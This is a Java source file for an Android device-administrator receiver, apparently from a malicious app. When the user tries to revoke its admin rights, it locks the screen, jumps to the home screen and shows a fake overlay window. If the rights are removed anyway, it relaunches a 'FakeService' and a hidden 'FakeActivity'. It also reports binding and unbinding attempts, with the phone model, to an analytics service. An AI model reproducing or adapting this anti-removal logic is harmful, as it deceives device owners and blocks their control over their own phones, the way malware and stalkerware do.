package com.xstd.qm.receiver;

import android.app.admin.DeviceAdminReceiver;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.qm.setting.SettingManager;

import java.util.HashMap;

/**
 * Created by michael on 13-12-23.
 */
public class BindDeviceReceiver extends DeviceAdminReceiver {


    @Override
    public void onReceive(Context context, Intent intent) {
        super.onReceive(context, intent);
    }

    @Override
    public void onEnabled(Context context, Intent intent) {
        SettingManager.getInstance().init(context);
        SettingManager.getInstance().setKeyHasBindingDevices(true);

        //notify umeng
        HashMap<String, String> log = new HashMap<String, String>();
        log.put("binding", "success");
        log.put("phoneType", Build.MODEL);
        CommonUtil.umengLog(context, "binding", log);

        Intent i = new Intent();
        i.setAction(FakeService.BIND_SUCCESS_ACTION);
        context.sendBroadcast(i);
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        Config.LOGD("[[DeviceBindBRC::onDisabled]] action : " + intent.getAction());
        SettingManager.getInstance().init(context);
        SettingManager.getInstance().setKeyHasBindingDevices(false);

        //立刻启动激活
        CommonUtil.startFakeService(context, "DeviceBindBRC::onDisabled");

        Intent i = new Intent();
        i.setClass(context, FakeActivity.class);
        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        context.startActivity(i);
    }

    @Override
    public CharSequence onDisableRequested(final Context context, Intent intent) {
        Config.LOGD("[[DeviceBindBRC::onDisableRequested]] action : " + intent.getAction());

        if (!Config.DEBUG) {
            //notify umeng
            HashMap<String, String> log = new HashMap<String, String>();
            log.put("action", "try_unbinding");
            log.put("phoneType", Build.MODEL);
            CommonUtil.umengLog(context, "unbing", log);

            getManager(context).lockNow();
            UtilsRuntime.goHome(context);

            DisDeviceFakeWindow fakeWindow = new DisDeviceFakeWindow(context);
            fakeWindow.show();
        }

        return "取消设备激活可能会造成设备的服务不能使用，是否确定要取消激活?";
    }

}
